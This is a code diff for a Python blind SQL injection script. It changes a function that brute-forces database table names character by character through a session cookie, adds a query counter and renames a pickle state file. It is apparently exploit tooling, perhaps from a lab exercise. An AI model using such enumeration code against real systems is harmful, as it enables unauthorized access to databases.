@@ -25,21 +25,26 @@ def get_table_names(cookie):
     queue = ['']
     all_table_names = []
     program_state = []
+    no_of_queries = 0
 
     while queue:
         queue_word = queue.pop(0)
         for a in alphabets:
             word = queue_word + a
-            if inject.inject(cookie=cookie, query=builder_query(length=len(word), word=word)):
+            query = builder_query(length=len(word), word=word)
+            no_of_queries += 1
+            if inject.inject(cookie=cookie, query=query):
                 print(f'Found Word: {word}, {len(word)}')
                 all_table_names.append(word)
                 queue.append(word)
 
         program_state.append([queue, all_table_names])
-        pickle.dump(program_state, open('states/program_state.pkl', 'wb'))
+        pickle.dump(program_state, open('states/program_state_tables.pkl', 'wb'))
 
     for table_name in all_table_names:
-        if inject.check(cookie=cookie, query=check_query(table_name)):
+        query = check_query(table_name)
+        no_of_queries += 1
+        if inject.check(cookie=cookie, query=query):
             print(f'Found Table: {table_name}')
             tables.append(table_name)
 
